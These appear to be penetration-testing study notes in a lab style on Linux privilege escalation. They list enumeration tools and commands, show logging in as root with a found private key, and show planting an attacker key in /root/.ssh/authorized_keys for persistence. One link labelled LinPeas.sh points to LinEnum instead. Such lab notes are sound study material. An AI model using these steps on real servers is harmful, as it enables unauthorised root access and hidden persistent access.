
> How to search: [Windows](https://hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html) and [Linux](https://hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html) 

**Automated scripts**
[PEASS](https://github.com/peass-ng/PEASS-ng) for server privilege escalation

```bash
./linpeas.sh
```
[LinPeas.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

**Inspecting software**
```bash
dpkg -l
```

**User privileges**
```bash
sudo -u user /bin/echo Hello World!
```
### Credentials 

Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows).

**ssh**
`/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`

```bash
st3phan0@htb[/htb]$ vim id_rsa 
st3phan0@htb[/htb]$ chmod 600 id_rsa 
st3phan0@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
```

**Trick to ssh**
after we gain control to a user account, we can leave our pub key in the allowed ssh credentials, so that we can ssh into the server next time
``` bash
ssh-keygen -f key
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```